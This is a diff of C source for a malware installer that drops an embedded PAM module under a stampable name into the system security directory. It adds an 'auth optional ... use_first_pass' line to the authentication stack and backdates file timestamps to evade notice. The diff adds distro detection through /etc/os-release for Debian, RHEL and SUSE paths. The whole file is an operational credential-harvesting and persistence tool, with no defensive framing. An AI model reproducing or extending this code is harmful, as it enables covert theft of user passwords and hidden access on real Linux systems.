@@ -6,6 +6,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 #include <unistd.h>
 #include <utime.h>
 
@@ -19,8 +20,13 @@
     #define DEBUG_LOG(...)
 #endif
 
-static const char* c_auth_stack_debian = "/etc/pam.d/common-auth";
-static const char* c_auth_stack_rhel = "/etc/pam.d/password-auth";
+typedef enum
+{
+    NONE,
+    DEBIAN,
+    RHEL,
+    SUSE,
+} distro_t;
 
 // stampable values - configured via web interface or helper script
 static const char c_mod_name[128] = "BASKETBALLJONES";
@@ -33,7 +39,7 @@ time_t best_mtime(const char *filepath)
     time_t best_time = 0;
     char *dirname = strdup(filepath);
     char *basename = NULL;
-
+    
     if (NULL != dirname)
     {
         struct dirent **names = NULL;
@@ -94,29 +100,54 @@ time_t best_mtime(const char *filepath)
 //
 // drop the pam module to disk
 //
-int drop_pam_mod(char* mod_path)
+int drop_pam_mod(distro_t distro)
 {
     int retval = -1;
 
-    time_t best_timestamp = best_mtime(mod_path);
-    if (0 != best_timestamp)
+    if (distro)
     {
-        FILE *pam_mod = fopen(mod_path, "w");
-        if (NULL != pam_mod)
+        char mod_path[128] = {0};
+
+        switch(distro)
         {
-            struct utimbuf times = {best_timestamp, best_timestamp};
-            if (sizeof(c_PamModule) == fwrite((void *)c_PamModule, sizeof(char), sizeof(c_PamModule), pam_mod))
+        case DEBIAN:
+            snprintf(mod_path, sizeof(mod_path) - 1, "/lib/x86_64-linux-gnu/security/%s.so", c_mod_name);
+            break;
+        case RHEL:
+            snprintf(mod_path, sizeof(mod_path) - 1, "/usr/lib64/security/%s.so", c_mod_name);
+            break;
+        case SUSE:
+            snprintf(mod_path, sizeof(mod_path) - 1, "/lib64/security/%s.so", c_mod_name);
+            break;
+        default:
+            break;
+        }
+
+        time_t best_timestamp = best_mtime(mod_path);
+        if (0 != best_timestamp)
+        {
+            FILE *pam_mod = fopen(mod_path, "w");
+            if (NULL != pam_mod)
             {
-                DEBUG_LOG("Dropped pam module : %s\n", mod_path);
+                struct utimbuf times = {best_timestamp, best_timestamp};
+                size_t written = fwrite((void *)c_PamModule, sizeof(char), sizeof(c_PamModule), pam_mod);
+                fclose(pam_mod);
 
-                retval = 0;  // install has been successful - timestamp fix is optional
-
-                if (0 == utime(mod_path, &times))
+                if (written == sizeof(c_PamModule))
                 {
-                    DEBUG_LOG("Set timestamps for %s\n", mod_path);
+                    // TODO: proper file permissions seem to vary by distro?
+                    if (0 == chmod(mod_path, (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH)))
+                    {
+                        DEBUG_LOG("Dropped pam module : %s\n", mod_path);
+
+                        retval = 0;  // install has been successful - timestamp fix is optional
+                    }
+                    if (0 == utime(mod_path, &times))
+                    {
+                        DEBUG_LOG("Set timestamps for %s\n", mod_path);
+                    }
                 }
             }
-            fclose(pam_mod);
         }
     }
 
@@ -125,47 +156,57 @@ int drop_pam_mod(char* mod_path)
 
 
 //
-// add the pam module to the appropriate auth stack
+// add the pam module to the specified auth stack config
 //
-int config_auth_stack()
+int config_auth_stack(distro_t distro)
 {
     int retval = -1;
-
-    char *auth_stack = NULL;
-
-    if (0 == access(c_auth_stack_debian), F_OK)
-    {
-        auth_stack = c_auth_stack_debian;
-    }
-    else if (0 == access(c_auth_stack_rhel), F_OK)
-    {
-        auth_stack = c_auth_stack_rhel;
-    }
     
-    if (auth_stack)
+    if (distro)
     {
-        // save off timestamp for later
-        time_t timestamp = best_mtime(auth_stack);
+        char *conf_path = NULL;
 
-        if (FILE *pam_conf = fopen(auth_stack, "a"))
+        switch(distro)
         {
-            char entry[128] = {0};
-            struct utimbuf times = {timestamp, timestamp};
+        case DEBIAN:
+            conf_path = "/etc/pam.d/common-auth";
+            break;
+        case RHEL:
+            conf_path = "/etc/pam.d/password-auth";
+            break;
+        case SUSE:
+            conf_path = "TODO";
+            break;
+        default:
+            break;
+        }
 
-            // TODO: determine if appending to the end ALWAYS results in a good config
-
-            if (0 < fprintf(pam_conf, "\nauth    optional                        %s.so use_first_pass", c_mod_name))
+        time_t timestamp = best_mtime(conf_path);
+        if (timestamp)
+        {
+            FILE *pam_conf = fopen(conf_path, "a");
+            if (pam_conf)
             {
-                DEBUG_LOG("Added %s.so to %s\n", c_mod_name, auth_stack);
-                
-                retval = 0;  // install has been successful - timestamp fix is optional
+                char entry[128] = {0};
+                struct utimbuf times = {timestamp, timestamp};
 
-                if (0 == utime(auth_stack, &times))
+                // TODO: figure out where to insert the modules in each stack
+                int written =
+                        fprintf(pam_conf, "\nauth    optional                        %s.so use_first_pass", c_mod_name);
+                fclose(pam_conf);
+
+                if (written > 0)
                 {
-                    DEBUG_LOG("Set timestamps for %s", auth_stack);
+                    DEBUG_LOG("Added %s.so to %s\n", c_mod_name, conf_path);
+                    
+                    retval = 0;  // install has been successful - timestamp fix is optional
+
+                    if (0 == utime(conf_path, &times))
+                    {
+                        DEBUG_LOG("Set timestamps for %s\n", conf_path);
+                    }
                 }
             }
-            fclose(pam_conf);
         }
     }
 
@@ -176,19 +217,39 @@ int main()
 {
     int retval = -1;
 
-    char mod_path[128] = {0};
-    snprintf("/lib/x86_64-linux-gnu/security/%s.so", sizeof(mod_path) - 1, c_mod_name);
-
-    if (0 == drop_pam_mod(mod_path))
+    distro_t distro = NONE;
+    FILE *os_release = fopen("/etc/os-release", "r");
+    if (NULL != os_release)
     {
-        if (0 == config_auth_stack())
+        char os_buf[256] = {0};
+        size_t read = fread(os_buf, sizeof(char), sizeof(os_buf), os_release);
+        fclose(os_release);
+
+        if (read)
         {
-            DEBUG_LOG("PAM mod installed!\n");
-            retval = 0;
+            if (NULL != strstr(os_buf, "debian"))
+            {
+                distro = DEBIAN;
+            }
+            else if (NULL != strstr(os_buf, "rhel"))
+            {
+                distro = RHEL;
+            }
+            else if (NULL != strstr(os_buf, "suse"))
+            {
+                distro = SUSE;
+            }
         }
-        else
+    }
+    if (distro)
+    {
+        if (0 == drop_pam_mod(distro))
         {
-            unlink(mod_path);
+            if (0 == config_auth_stack(distro))
+            {
+                DEBUG_LOG("PAM mod installed!\n");
+                retval = 0;
+            }
         }
     }
 
